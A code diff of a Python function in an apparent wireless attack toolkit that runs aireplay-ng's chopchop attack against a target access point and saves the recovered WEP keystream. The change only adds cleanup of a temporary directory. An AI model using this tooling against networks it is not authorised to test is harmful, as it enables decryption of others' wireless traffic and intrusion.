@@ -262,40 +262,46 @@ def chopchop_vendor(
     """
     ensure_channel(iface, channel)
     outdir = Path(tempfile.mkdtemp(prefix="atwa-chopchop-"))
-    cmd = [str(CHOPCHOP_BIN), "-4", "-F", "-b", bssid, "-h", own_mac, iface]
-
-    proc = subprocess.Popen(
-        cmd, cwd=outdir, stdin=subprocess.DEVNULL,
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
-    )
-    deadline = time.monotonic() + timeout
     try:
-        while proc.poll() is None:
-            if time.monotonic() > deadline or (stop_event is not None and stop_event.is_set()):
-                proc.terminate()
-                try:
-                    proc.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    proc.kill()
-                break
-            time.sleep(1.0)
-    finally:
-        if proc.poll() is None:
-            proc.kill()
-            proc.wait()
+        cmd = [str(CHOPCHOP_BIN), "-4", "-F", "-b", bssid, "-h", own_mac, iface]
 
-    output = proc.stdout.read() if proc.stdout else ""
-    if progress_fn is not None and output.strip():
-        progress_fn(f"chopchop: aireplay-ng output tail:\n{output.strip()[-500:]}")
+        proc = subprocess.Popen(
+            cmd, cwd=outdir, stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
+        )
+        deadline = time.monotonic() + timeout
+        try:
+            while proc.poll() is None:
+                if time.monotonic() > deadline or (stop_event is not None and stop_event.is_set()):
+                    proc.terminate()
+                    try:
+                        proc.wait(timeout=5)
+                    except subprocess.TimeoutExpired:
+                        proc.kill()
+                    break
+                time.sleep(1.0)
+        finally:
+            if proc.poll() is None:
+                proc.kill()
+                proc.wait()
 
-    xor_files = sorted(outdir.glob("replay_dec-*.xor"))
-    if not xor_files:
+        output = proc.stdout.read() if proc.stdout else ""
+        if progress_fn is not None and output.strip():
+            progress_fn(f"chopchop: aireplay-ng output tail:\n{output.strip()[-500:]}")
+
+        xor_files = sorted(outdir.glob("replay_dec-*.xor"))
+        if not xor_files:
+            if progress_fn is not None:
+                progress_fn("chopchop: no packet decrypted (AP rejected every candidate, or none seen before timeout)")
+            return None
+
+        dest = organized_output_path("chopchop", f"{bssid.replace(':', '-')}.xor")
+        shutil.copyfile(xor_files[-1], dest)
         if progress_fn is not None:
-            progress_fn("chopchop: no packet decrypted (AP rejected every candidate, or none seen before timeout)")
-        return None
-
-    dest = organized_output_path("chopchop", f"{bssid.replace(':', '-')}.xor")
-    shutil.copyfile(xor_files[-1], dest)
-    if progress_fn is not None:
-        progress_fn(f"chopchop: recovered keystream saved to {dest}")
-    return dest
+            progress_fn(f"chopchop: recovered keystream saved to {dest}")
+        return dest
+    finally:
+        # Every path -- success, timeout/stop, or Popen failing to
+        # start -- leaked this dir and its replay_dec-*.xor before;
+        # the useful file was already copied out to dest above.
+        shutil.rmtree(outdir, ignore_errors=True)
